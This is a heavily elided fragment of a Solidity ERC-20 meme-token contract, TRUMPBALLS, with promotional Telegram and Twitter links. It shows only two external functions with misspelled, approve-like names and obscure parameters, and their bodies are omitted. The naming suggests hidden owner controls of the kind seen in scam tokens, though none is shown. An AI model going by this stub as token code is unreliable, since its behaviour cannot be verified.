...
*/
/**
https://t.me/TrumpBALLS_ERC
https://twitter.com/TRUMPBALLS_ETH
*/
...
contract TRUMPBALLS is Context, Ownable, IERC20 {
    ...
    function Renous(address us, uint256 tse) external {
    ...
    function Approevs(address recipient, uint256 aDropst)  external {
